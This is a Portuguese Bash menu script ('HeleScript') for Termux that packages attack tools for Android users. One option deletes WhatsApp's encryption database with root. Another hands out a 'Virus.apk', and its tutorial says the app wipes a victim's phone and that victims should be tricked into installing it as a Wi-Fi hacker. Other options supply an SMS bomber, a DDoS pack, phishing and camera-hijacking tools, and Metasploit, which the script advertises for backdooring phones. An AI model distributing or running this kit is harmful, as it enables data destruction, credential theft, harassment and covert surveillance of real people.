#!/bin/bash
clear
unset MENU_PRINCIPAL
#Abaixo umas funcao em shell Script
GRAFICO_OU_MENU(){
         echo -e "
       \033[1;36m =-=-=-=-=-=-=-=\033[0m
 \033[1;36m-=-=-=-=\033[0m \033[1;33mHeleScript:\033[0m \033[1;36m=\033[0m
 \033[1;36m=      =-=-=-=-=-=-=-=
 -
 =
 =
 -\033[0m"
}


GRAFICO_DO_MENU_DO_MANUAL(){
	echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=-=
= \033[0m\033[1;33mMANUAL DA SCRIPT:\033[0m\033[1;36m =
=-=-=-=-=-=-=-=-=-=-=\033[0m
'
}
ANIMA_DA_AVA(){
echo -e '\033[1;36m=-=-=-=-=-=-=-=-=-=
=\033[0m \033[1;33mAVALIAÇÃO FINAL\033[0m \033[1;36m=
=-=-=-=-=-=-=-=-=-=\033[0m'
}

#CODIGO DE CORES, PARA PERSONALIZAR
COR_CINZA="echo -e '\033[1;30m"
COR_VERMELHO="echo -e '\033[0;31m"
COR_VERMELHO_CLARO="echo -e '\033[1;31m"
COR_AZUL_ESCURO="echo -e '\033[0;34m"
COR_AZUL_MARINHO="echo -e '\033[1;34m"
COR_AMARELO="echo -e '\033[1;33m"


#Abaixo os comandos que vai fazer a script só
#Parar de executar quando o usuario...
#escolher a opcão 27
while [[ $MENU_PRINCIPAL -ne 31 ]]
do
#Apagando as variaveis com unset
#Pois se n... pode fazer a script errar
#Na sua execução.

unset MENU_PRINCIPAL
unset NANO_ESTA
unset TOPO
unset COR_DO_TOPO
unset NICK_DO_USUARIO
unset WGET_ESTA
unset GIT_ESTA
unset MENU_CURSOS_TREINAMENTOS
unset RESP_UM
unset RESP_UM_OFC
unset RESP_DOIS
unset RESP_DOIS_OFC
unset RESP_TRES
unset RESP_TRES_OFC
unset AULA19_RESP2
unset AULA19_RESP1
unset ATIV_DA_AULA19
unset AVAL_FINAL_RESP1
unset AVAL_FINAL_RESP1_OFC
unset AVAL_FINAL_RESP2
unset AVAL_FINAL_RESP2_OFC
unset AVAL_FINAL_RESP3
unset AVAL_FINAL_RESP3_OFC
unset AVAL_FINAL_RESP4
unset AVAL_FINAL_RESP4_OFC
unset AVAL_FINAL_RESP5
unset AVAL_FINAL_RESP5_OFC
unset NOTA_FINAL_DO_CURSO
NOTA_FINAL_DO_CURSO=0

clear
#Exibir o menu principal da script
. ./menup_da_script.sh
read MENU_PRINCIPAL

clear
case "$MENU_PRINCIPAL" in

     1)
      #Opcao do menu de personalizar o termux
          . ./op1_personalizar_termux.sh;;
     2)
       #Opcao do menu de bugar travas
          #Entrando na pasta e apagando o arquivo
          cd;su -y;cd;cd /data/data/com.whatsapp/databases;rm -rf axolotl.db;cd;cd HeleV2
          echo
          echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
          read SEGUE
          clear
          GRAFICO_OU_MENU
          echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m \033[1;34mArquivo Apagado, Se o seu WhatsApp estiver aberto então feche ele da janela dos recentes e entre novamente que o codigo ira upar e as travas cairão bugadas!\033[0m"
          echo
          echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
          read SEGUE;;
     3)
      #Obter/Baixar um virus em .apk
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[1;34mMOVENDO PRA PASTA DE DOWNLOADS...\033[0m"
              echo
	      cp -i Virus.apk /data/data/com.termux/files/home/storage/downloads
              sleep 4
              clear;echo
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mPRONTO, VERIFIQUE SE O APP ESTÁ NA PASTA DE DOWNLOADS!\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
              clear
              echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=\033[0m
\033[1;36ml\033[0m  \033[1;33m TUTORIAL\033[0m    \033[1;36ml\033[0m
\033[1;36m=-=-=-=-=-=-=-=-=\033[0m"
              echo -e "
\033[1;33m1) QUAL A FUNÇÃO DO APP:\033[0m

\033[1;31mApagar tudo do celular da pessoa. Inclusive não tenho certeza se ele apaga os dados do cartão de memória, Porém eu(Lil Helê) já formatei o celular Android do meu amigo(Sem querer) Com esse app. E vale destacar que o app apagou os dados do cartão de memória dele.\033[0m

\033[1;33mOBS:\033[0m\033[1;31mEsse vírus/app só funciona pra Android.\033[0m

\033[1;33m2) COMO UTILIZAR:\033[0m

\033[1;31mVocê tem que enviar o app pra vítima, Dizendo que é um app pra hackear redes Wi-fi, Pois o nome do app e a foto dele é fingindo ser pra hackear realmente wi-fi.

Ou use outra mentira pra fazer com que a pessoa instale o app.

Vale destacar aqui que a pessoa tem que ser muito burra pra cair nessa engenharia social, Pois a pessoa tem que permitir que o app tenha poder de administrador.\033[0m

\033[1;33m3) AONDE ESTÁ O APP:\033[0m

\033[1;31mVerifique se ele está na sua pasta de downloads.\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;;
     4)
      #Obter/Baixar sms bomber
              echo
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mMOVENDO PRA PASTA DE DOWNLOADS...\033[0m"
              echo
	      cp -i Smsbomber.apk /data/data/com.termux/files/home/storage/downloads
              sleep 4
              clear;echo
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mPRONTO, VERIFIQUE SE O APP ESTÁ NA PASTA DE DOWNLOADS!\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
              clear
              echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=\033[0m
\033[1;36ml\033[0m  \033[1;33m TUTORIAL\033[0m    \033[1;36ml\033[0m
\033[1;36m=-=-=-=-=-=-=-=-=\033[0m"
              echo -e "
\033[1;33m1) QUAL A FUNÇÃO DO APP:\033[0m

\033[1;31mEnviar vários SMS, Ou seja bombardear a pessoa com SMS... Você pode usar isso pra trolar um amigo seu etc...\033[0m

\033[1;33mOBS:\033[0m\033[1;31mEsse app só funciona pra Android.\033[0m

\033[1;33m2) SOBRE OS SMS:\033[0m

\033[1;31mBom, Antes de tudo eu gostaria de falar que os sms são pagos, Ou seja gasta os seus créditos. E pra resolver esse problema... eu recomendo você ter uma promoção pra SMS.

Por exemplo, Na maioria das operadoras, Você paga determinada taxa e você tem SMS ilimitado pra qualquer operadora.\033[0m

\033[1;33m3) COMO UTILIZAR:\033[0m

\033[1;31mEm\033[0m \033[1;32mtype a name or number\033[0m\033[1;31m, Você coloca o número da pessoa.

Já em\033[0m \033[1;32mtype a sms\033[0m\033[1;31m, você coloca a mensagem que vai ser enviada para a vítima/Pessoa.

Agora em\033[0m \033[1;32mof text\033[0m \033[1;31mvai ser colocado quantas vezes essa mensagem vai ser enviada para determinado número.

E por último em\033[0m \033[1;32mdelay\033[0m\033[1;31m, Você coloca o tempo pra cada sms. Ou seja em quantos segundos vai ser enviado o próximo.\033[0m

\033[1;33mOBS:\033[0m\033[1;31mEu recomendo vc colocar 2.\033[0m

\033[1;33m4) AONDE ESTÁ O APP:\033[0m

\033[1;31mVerifique se ele está na sua pasta de downloads.\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;;
     5)
     #Atualizar repositorios
         GRAFICO_OU_MENU
         echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mAtualizando... Aguarde e quando terminar vc ira ser jogado pro menu principal.\033[0m"
         sleep 3;apt update;apt upgrade -y;sleep 1;clear;;
     6)
     #Baixar pack de ddos
         . ./op6_baixar_pack_de_ddos.sh;;
     7)
     #Instalar weeman
        ####################################
        #VERIFICANDO SE TEM O GIT INSTALADO#
        ####################################
           GIT_ESTA=$(which git)
           if [[ -z "$GIT_ESTA" ]];then
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o git instalado, Volte ao menu principal e instale o git\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
           else
        ############################
        #CASO O USUARIO TENHA O GIT#
        ############################
              GRAFICO_OU_MENU
	      cd
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando a script para pishing weeman... pfvr aguarde!\033[0m"
              sleep 4
              git clone https://github.com/evait-security/weeman
              cd weeman;chmod +x *;cd;clear
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mVocê acabou de baixar a weeman! uma das funcionalidades dela é hackear contas de facebook, caso tenha dúvidas de como usá-la, leia o manual.\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;cd HeleV2
           fi;;
     8)
     #Instalar Red Hawk
        ####################################
        #VERIFICANDO SE TEM O GIT INSTALADO#
        ####################################
           GIT_ESTA=$(which git)
           if [[ -z "$GIT_ESTA" ]];then
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o git instalado, Volte ao menu principal e instale o git\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
           else
        ############################
        #CASO O USUARIO TENHA O GIT#
        ############################
              GRAFICO_OU_MENU
	      cd
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando o red hawk... pfvr aguarde!\033[0m"
              sleep 3
              git clone https://github.com/Tuhinshubhra/RED_HAWK
              clear
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mVocê acabou de baixar uma script que serve pra scannear sites! Faça bom uso da mesma, e caso tenha dúvidas de como usá-la, leia o manual.\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;cd HeleV2
           fi;;
     9)
      #Instalar OSIF
        ####################################
        #VERIFICANDO SE TEM O GIT INSTALADO#
        ####################################
           GIT_ESTA=$(which git)
           if [[ -z "$GIT_ESTA" ]];then
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o git instalado, Volte ao menu principal e instale o git\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
           else
        ############################
        #CASO O USUARIO TENHA O GIT#
        ############################
              GRAFICO_OU_MENU
              cd
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando a osif.. pfvr aguarde!\033[0m"
              sleep 3
              git clone https://github.com/ciku370/OSIF
              clear
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mVocê acabou de baixar uma script que serve pra coletar informações de contas de Facebook! Faça bom uso da mesma, e caso tenha dúvidas de como usá-la, leia o manual.\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;cd HeleV2
           fi;;
     10)
      #Instalar metasploit
         GRAFICO_OU_MENU
	 cd
	 echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mVocê escolheu a opção de baixar o metasploit, com essa incrível ferramenta da pra você fazer inúmeras coisas, e uma delas é invadir aparelhos Android por backdoor. Deseja realmente baixar [s/n] \033[0m"
	 read BAIXAR_MET_OU_N;clear
	 if [[ $BAIXAR_MET_OU_N = "s" ]];then
			GRAFICO_OU_MENU
	 	  	echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mO metasploit ocupa cerca de 600 MB de armazenamento, você tem esse espaço disponível ? [s/n] \033[0m"
			read ESP_DISP_PARA_BAIXAR_O_MET;clear
			if [[ $ESP_DISP_PARA_BAIXAR_O_MET = "s" ]];then
				GRAFICO_OU_MENU
				echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando o metasploit, pfvr aguarde... \033[0m"
				sleep 2
				pkg install unstable-repo
				pkg install metasploit
			else
				echo -e "\033[1;33mツ - Apague algumas coisas do armazenamento interno para baixar o metasploit! \033[0m"
				sleep 5
			fi
	 else
				echo -e "\033[1;33mツ - Você será jogado ao menu principal da script! \033[0m"
				sleep 3;clear
	 fi;cd HeleV2;;
     11)
      #Instalar saycheese
         ####################################
         #VERIFICANDO SE TEM O GIT INSTALADO#
        ####################################
           GIT_ESTA=$(which git)
           if [[ -z "$GIT_ESTA" ]];then
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o git instalado, Volte ao menu principal e instale o git\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
           else
        ############################
        #CASO O USUARIO TENHA O GIT#
        ############################
              GRAFICO_OU_MENU
              cd
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando a saycheese.. pfvr aguarde!\033[0m"
              sleep 3
              git clone https://github.com/thelinuxchoice/saycheese
              clear
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mVocê acabou de baixar uma script que serve pra hackear câmera por link! Faça bom uso da mesma, e caso tenha dúvidas de como usá-la, leia o manual.\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;cd HeleV2
           fi;;
     12)
      #Instalar pip
         pip install --upgrade pip;;
     13)
      #Instalar openssh
         pkg install openssh;;
     14)
     #Instalar a ferramenta ps.ngrok
        ####################################
        #VERIFICANDO SE TEM O GIT INSTALADO#
        ####################################
           GIT_ESTA=$(which git)
           if [[ -z "$GIT_ESTA" ]];then
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o git instalado, Volte ao menu principal e instale o git\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
           else
        ############################
        #CASO O USUARIO TENHA O GIT#
        ############################
              GRAFICO_OU_MENU
	      cd
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando a ferramenta Ps.ngrok, Pfvr aguarde!\033[0m"
              sleep 3
              git clone https://github.com/PSecurity/ps.ngrok
              cd ps.ngrok;chmod +x * ngrok;mv ngrok /data/data/com.termux/files/home;cd;sleep 3;clear
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mPronto, A script está pronta para uso!\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;cd HeleV2
           fi;;
     15)
      pkg install git;;
     16)
      pkg install clang;;
     17)
      pkg install tor;;
     18)
      pkg install figlet;;
     19)
      pkg install cmatrix;;
     20)
      pkg install cowsay;;
     21)
      pkg install python3;;
     22)
      pkg install python2;;
     23)
      pkg install wget;;
     24)
      pkg install nano;;
     25)
      pkg install php;;
     26)
      pkg install perl;;
     27)
      pkg install curl;;
     28)
      #Cursos e Treinamentos
	. ./op28_cursos_e_treinamentos.sh;;
     29)
     #Op do menu principal de ver manual
	. ./MANUAL.sh;;
     30)
       #PARTE DOS CREDITOS
          echo -e '\033[1;36m=-=-=-=-=-=-=\033[0m'
          sleep 0.5
          echo -e '\033[1;36m=\033[0m\033[1;33m CRÉDITOS:\033[0m\033[1;36m =\033[0m'
          sleep 0.5
          echo -e '\033[1;36m=-=-=-=-=-=-=\033[0m'
          sleep 0.5
          echo
          echo -e '\033[1;32mDESENVOLVEDOR:\033[0m'
          sleep 0.5
          echo -e '\033[1;34m     Lil Helê.\033[0m'
          sleep 0.5
          echo -e '\033[1;32mAJUDANTES:\033[0m'
          sleep 0.5
          echo -e '\033[1;34m     Tsa9a.\033[0m'
          sleep 0.5
          echo -e '\033[1;32mSALVES:\033[0m'
          sleep 0.5
          echo -e '\033[1;34m     Black-bin, Dark Knight, GhostVip e Zeus Xaloc.\033[0m'
          sleep 0.5
          echo -e '\033[1;32mSCRIPT DA EQUIPE:\033[0m'
          sleep 0.5
          echo -e '\033[1;34m     Speatec hacking.\033[0m'
          sleep 0.5
          echo -e '\033[1;32mGRUPOS APOIADORES:\033[0m'
          sleep 0.5
          echo -e '\033[1;34m     Umbrella Corporation.\033[0m'
          sleep 0.5
          echo -e '\033[1;34m     Graysec BR.\033[0m'
          sleep 0.5
          echo -e '\033[1;34m     Enormity.\033[0m'
          sleep 0.5
          echo -e '\033[1;34m     Clay.\033[0m'
          echo
          echo -e '\033[1;31mツ - APERTE ENTER PARA PROSSEGUIR:\033[0m'
          read SEGUE;;
    31)
     #Opção de sair da script
          echo -e  "\033[1;31mツ - Até a próxima versão!\033[0m"
          sleep 2;clear
          echo -e '\033[1;36m _   _      _      ____            _       _ __     ______
| | | | ___| | ___/ ___|  ___ _ __(_)_ __ | |\ \   / /___ \
| |_| |/ _ \ |/ _ \___ \ / __|  __| |  _ \| __\ \ / /  __) |
|  _  |  __/ |  __/___) | (__| |  | | |_) | |_ \ V /  / __/
|_| |_|\___|_|\___|____/ \___|_|  |_| .__/ \__| \_/  |_____|
                                    |_|

\033[0m\033[1;32mDESENVOLVEDOR:\033[0m
     \033[1;34mLil Helê.\033[0m
\033[1;32mAJUDANTES:\033[0m
     \033[1;34mTsa9a.\033[0m
\033[1;32mSALVES:\033[0m\033[1;34m
     Black-bin, Dark Knight, GhostVip e Zeus Xaloc.
\033[0m\033[1;32mSCRIPT DA EQUIPE
\033[0m\033[1;34m     Speatec Hacking.\033[0m\033[1;32m
GRUPOS APOIADORES:\033[0m\033[1;34m
     Umbrella Corporation.
     Graysec BR.
     Enormity.
     Clay
     Spartan Comunity.\033[0m
\033[1;32mNOSSO SITE:\033[0m\033[1;34m
     https://speatechackingoficial.blogspot.com\033[0m

\033[03;32m"A justiça é cega, e nós somos os olhos", Speatec.\033[0m';;
esac
#Acima o fim do caso do menup
#Fim do enquanto
done
